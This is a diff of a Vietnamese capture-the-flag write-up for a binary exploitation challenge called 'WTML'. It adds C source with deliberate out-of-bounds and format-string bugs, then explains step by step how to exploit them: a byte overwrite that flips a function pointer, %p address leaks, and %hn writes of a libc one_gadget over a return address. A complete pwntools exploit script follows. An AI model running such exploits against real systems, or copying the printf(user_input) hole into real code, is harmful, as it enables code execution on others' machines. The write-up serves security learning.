@@ -112,6 +112,103 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 # WTML
 
+## Source
+
+```c
+#include <errno.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+#define MESSAGE_LEN 0x20
+
+typedef void (*tag_replacer_func)(char *message, char from, char to);
+
+typedef struct tag_replacer {
+    uint8_t id;
+    tag_replacer_func funcs[2];
+} __attribute__((packed)) tag_replacer;
+
+void replace_tag_v1(char *message, char from, char to) {
+    size_t start_tag_index = -1;
+    for (size_t i = 0; i < MESSAGE_LEN - 2; i++) {
+        if (message[i] == '<' && message[i + 1] == from && message[i + 2] == '>') {
+            start_tag_index = i;
+            break;
+        }
+    }
+    if (start_tag_index == -1) return;
+
+    for (size_t i = start_tag_index + 3; i < MESSAGE_LEN; i++) {
+        if (message[i] == '<' && message[i + 1] == '/' && message[i + 2] == from) {
+            size_t end_tag_index = i;
+            message[start_tag_index + 1] = to;
+            message[end_tag_index + 2] = to;
+            return;
+        }
+    }
+}
+
+void replace_tag_v2(char *message, char from, char to) {
+    printf("[DEBUG] ");
+    printf(message);
+
+    // TODO implement
+
+    printf("Please provide feedback about v2: ");
+    char response[0x100];
+    fgets(response, sizeof(response), stdin);
+
+    printf("Your respones: \"");
+    printf(response);
+
+    puts("\" has been noted!");
+}
+
+void prompt_tag(const char *message, char *tag) {
+    puts(message);
+    *tag = (char) getchar();
+
+    if (getchar() != '\n' || *tag == '<' || *tag == '>') exit(EXIT_FAILURE);
+}
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+
+    tag_replacer replacer = {
+            .funcs = {replace_tag_v1, replace_tag_v2},
+            .id = 0,
+    };
+    char user_message[MESSAGE_LEN] = {0};
+
+    puts("Please enter your WTML!");
+    fread(user_message, sizeof(char), MESSAGE_LEN, stdin);
+
+    while (true) {
+        // Replace tag
+        char from = 0;
+        prompt_tag("What tag would you like to replace [q to quit]?", &from);
+
+        if (from == 'q') {
+            exit(EXIT_SUCCESS);
+        }
+
+        char to = 0;
+        prompt_tag("With what new tag?", &to);
+
+        replacer.funcs[replacer.id](user_message, from, to);
+
+        puts(user_message);
+    }
+}
+```
+
+## Ý tưởng
+
 - Bài này khá là khó, ta có thể phát hiện lỗi bof ở đây
 
 ```c
@@ -132,7 +229,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
             message[end_tag_index + 2] = to;
         //  message[32] = to
         //  message[33] = to
-        //  trong khi message[32]
+        //  trong khi message[] phần tử ta khởi tạo chỉ đến 31
 ```
 
 - Và chỗ này, hàm replace_1 được gọi
@@ -158,8 +255,9 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 - Đây là bước quan trọng
 - Nó sẽ thay đổi 2 kí tự, và thoát chương trình luôn, và như ở phân tích trên, ta có thể lợi dụng chỗ này để ghi đè được vì nó có thể truy cập phần tử ngoài mảng
-- Ở đây ta sẽ cho payload không thoả điều kiện hàm if để khi `i = 30` khi này `i + 1 = 31, i + 2 = 32 (phần tử ngoài mảng)` có thể ghi đè byte byte 0x00 ( để puts() leak đượ
-  ![image](https://user-images.githubusercontent.com/111769169/229440451-88d9f863-b3a4-4ae9-abd0-d697293daa6d.png)
+- Ở đây ta sẽ cho payload không thoả điều kiện hàm if để khi `i = 30` khi này `i + 1 = 31, i + 2 = 32 (phần tử ngoài mảng)` có thể ghi đè byte byte 0x00 ( để puts() leak được địa chỉ)
+
+![image](https://user-images.githubusercontent.com/111769169/229440451-88d9f863-b3a4-4ae9-abd0-d697293daa6d.png)
 
 - Tại i = 30 payload của chúng ta cần phải `<`, i + 1 = 31 sẽ là `/`, i + 2 = 32 payload sẽ là `0x00` vì giá trị `message[32] = 0x00` chính là byte 0x00 ở hình trên
 
@@ -182,7 +280,157 @@ int __cdecl main(int argc, const char **argv, const char **envp)
     payload += b"</"            # thoả if để ghi đè để leak
 
     r.sendafter(b" WTML!\n", payload)
-    r.sendlineafter(b" quit]?\n",  b'\0')
+    r.sendlineafter(b" quit]?\n",  b'\0')   # lần nhập thứ 2 ta
     r.sendlineafter(b"tag?\n", b'\1')   # ghi đè 0x1 vào byte 0x0 ảnh trên
 ```
 
+- Tiếp tục nó sẽ hỏi ta `What tag would you like to replace [q to quit]? và With what new tag?` ta vẫn sẽ trả lời để ở dòng call r8 tiếp theo nó sẽ đưa địa chỉ replace_2 thực hiện
+
+```python
+    r.sendlineafter(b" quit]?\n",  b'\0')
+    r.sendlineafter(b"tag?\n", b'\1')
+```
+
+- Khi thực hiện được hàm replace_2, trong đó có một lỗi FMT ở dưới, vậy nghĩa là ta có thể sử dụng %p để leak các địa chỉ như stack, exe, libc
+
+```c
+    printf(message);
+```
+
+- Do là phải leak các địa chỉ, mà công cụ mình dùng leak là chuỗi ban đầu mình gửi vào nên ta sẽ cần sửa lại một xíu
+
+```python
+    payload = b'<\0>' + b'%40$p%53$p'.ljust(27, b'A') + b'</'
+
+    r.sendafter(b" WTML!\n", payload)
+    r.sendlineafter(b" quit]?\n",  b'\0')
+    r.sendlineafter(b"tag?\n", b'\1')
+```
+
+- Đây là payload của em
+
+```python
+    r.recvuntil(b">")
+    leak_stack = int(r.recv(14), 16)
+    ret_replace_2 = leak_stack - 0x58
+    leak_libc = int(r.recv(14), 16)
+    libc.address = leak_libc - 147587
+    log.info("leak libc & leak stack: " +
+             hex(leak_libc) + " " + hex(leak_stack))
+    log.info("libc base: " + hex(libc.address))
+```
+
+- ta không thể ret2win vì `fgets` đã giới hạn lại 100 kí tự, nhưng ta có fmt để thay đổi địa chỉ
+- ở dòng `ret_replace_2 = leak_stack - 0x58` thì khi mà em leak được địa chỉ stack thì địa chỉ ta cần là địa chỉ stack chứa ret của rip của replace_2, offset từ địa chỉ ta leak được đến địa chỉ chứa ret là 0x58
+
+![image](https://user-images.githubusercontent.com/111769169/229779727-d0d8209a-6243-4d8b-ac92-726e7e7859d2.png)
+
+- dòng này đơn giản là leak_libc tính toán địa chỉ libc base
+
+```python
+    leak_libc = int(r.recv(14), 16)
+    libc.address = leak_libc - 147587
+    log.info("leak libc & leak stack: " +
+             hex(leak_libc) + " " + hex(leak_stack))
+    log.info("libc base: " + hex(libc.address))
+```
+
+- Do trong file không có hàm nào chứa `system("/bin/sh")`, nên ta sẽ ret2libc, cụ thể là one_gadget, one_gadget ta cần là `libc.sym['one_gadget'] = 0xe3b01`
+- Vậy ta cần phải là ghi đè one_gadget vào rip
+- Ta cần chuẩn bị một số bước
+
+- Chỗ này lú quá, nên ta có thể coi lại video `Tấn công địa chỉ base của .fini_array` =))
+
+```python
+    package = {
+        (libc.sym['one_gadget'] >> 0) & 0xffff: ret_replace_2 + 0,
+        (libc.sym['one_gadget'] >> 16) & 0xffff: ret_replace_2 + 2,
+        (libc.sym['one_gadget'] >> 32) & 0xffff: ret_replace_2 + 4,
+    }
+    order = sorted(package)
+    payload = f'%{order[0]}c%20$hn'.encode()
+    payload += f'%{order[1] - order[0]}c%21$hn'.encode()
+    payload += f'%{order[2] - order[1]}c%22$hn'.encode()
+    payload = payload.ljust(0x60, b'P')
+    payload += flat(
+        package[order[0]],      #địa chỉ
+        package[order[1]],
+        package[order[2]],
+    )
+    r.sendlineafter(b'about v2: ', payload)
+```
+
+## Kết quả
+
+<details> <summary> full script </summary>
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./challenge_patched")
+libc = ELF("./libc-2.31.so")
+ld = ELF("./ld-2.31.so")
+libc.sym['one_gadget'] = 0xe3b01
+context.binary = exe
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        gdb.attach(r, gdbscript='''
+                   b*main+305
+                   c
+                   ''')
+        input()
+    else:
+        r = remote("addr", 1337)
+
+    return r
+
+
+def main():
+    r = conn()
+    payload = b'<\0>' + b'%40$p%53$p'.ljust(27, b'A') + b'</'
+
+    r.sendafter(b" WTML!\n", payload)
+    r.sendlineafter(b" quit]?\n",  b'\0')
+    r.sendlineafter(b"tag?\n", b'\1')
+
+    r.sendlineafter(b" quit]?\n",  b'\0')
+    r.sendlineafter(b"tag?\n", b'\1')
+
+    r.recvuntil(b">")
+    leak_stack = int(r.recv(14), 16)
+    ret_replace_2 = leak_stack - 0x58
+    leak_libc = int(r.recv(14), 16)
+    libc.address = leak_libc - 147587
+    log.info("leak libc & leak stack: " +
+             hex(leak_libc) + " " + hex(leak_stack))
+    log.info("libc base: " + hex(libc.address))
+
+    package = {
+        (libc.sym['one_gadget'] >> 0) & 0xffff: ret_replace_2 + 0,
+        (libc.sym['one_gadget'] >> 16) & 0xffff: ret_replace_2 + 2,
+        (libc.sym['one_gadget'] >> 32) & 0xffff: ret_replace_2 + 4,
+    }
+    order = sorted(package)
+    payload = f'%{order[0]}c%20$hn'.encode()
+    payload += f'%{order[1] - order[0]}c%21$hn'.encode()
+    payload += f'%{order[2] - order[1]}c%22$hn'.encode()
+    payload = payload.ljust(0x60, b'P')
+    payload += flat(
+        package[order[0]],
+        package[order[1]],
+        package[order[2]],
+    )
+    r.sendlineafter(b'about v2: ', payload)
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+</details>
